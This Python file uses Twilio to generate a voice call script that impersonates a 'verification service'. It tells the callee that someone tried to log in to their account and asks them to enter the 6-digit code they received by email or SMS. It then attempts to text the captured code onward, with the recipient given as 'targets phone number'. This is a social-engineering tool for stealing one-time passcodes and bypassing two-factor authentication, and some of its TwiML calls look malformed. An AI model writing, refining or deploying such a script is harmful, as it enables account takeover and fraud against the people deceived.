from twilio.twiml.voice_response import VoiceResponse

def generate_verification_twiml():
    response = VoiceResponse()
    response.pause(length=4)
    response.say('Hello, and welcome to our verification service. You are receiving this call because someone has tried to log in to your account on an unknown device. For your security purposes, please enter your 6-digit PIN number that you received either by email or SMS/text to resolve these security measures. After you have typed in the correct 6-digit PIN please wait for verification.')
    gather = response.gather(num_digits=6, input='dtmf')
    gather.say('Please enter your 6-digit PIN number followed by the pound key.')
    response.pause(length=5)
    response.message('The customer\'s verification code is: {{Digits}}', to='targets phone number', from_='twilio number', method='POST')
    return str(response)

